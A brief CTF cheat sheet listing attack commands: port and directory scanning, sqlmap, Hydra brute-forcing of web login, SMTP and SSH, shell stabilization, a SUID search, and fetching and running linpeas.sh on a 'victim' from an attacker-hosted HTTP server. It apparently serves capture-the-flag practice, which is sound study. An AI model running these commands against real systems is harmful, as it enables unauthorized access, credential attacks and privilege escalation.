# CTF-cheatsheet
## RECON
### NMAP
`sudo nmap -sV -sT -A -p- IP`
### FFUF
`ffuf -u http://IP/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -ac` no extensions \
`ffuf -u http://IP/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -e .php,.js,.html,.txt -ac` with extensions 
#### Other extensions that could be used: .cfg, .bak, .json, etc.
### Dirsearch
`dirsearch -u http://IP`
### Sqlmap
`sqlmap -u http://IP --forms`
#### Depending on the situation, `--level=` and `--risk=` can be used
## EXPLOIT
* ExploitDB
* GitHub
* Metasploit
### Hydra
`hydra -L useranme.txt -P passwords.txt IP/DOMAIN_NAME http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid creds or something" -V -f`
>Login form brute-forcing

`hydra -l user -P list.lst IP smtps -V -f`
>SMTP/S Brute-forcing

`hydra -l user -P list.lst ssh://IP -V -f`
>SSH Brute-forcing

## PRIVESC
#### Shell stabilization
```
python3 -c 'import pty; pty.spawn("/bin/bash");'
export TERM=xterm
```
#### Background session
```
stty -raw echo
fg
```
#### Foreground back to victim

### Find SUID binaries
`find / -perm -u=s -type f 2>/dev/null`
### Get and run linpeas.sh
#### On attacker machine:
```
python3 -m http.server 9000
````
#### On victim
```
cd /tmp
wget -u http://IP:9000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```
#### Curl can also be used, or whatever method to get linpeas.sh on victim's machine
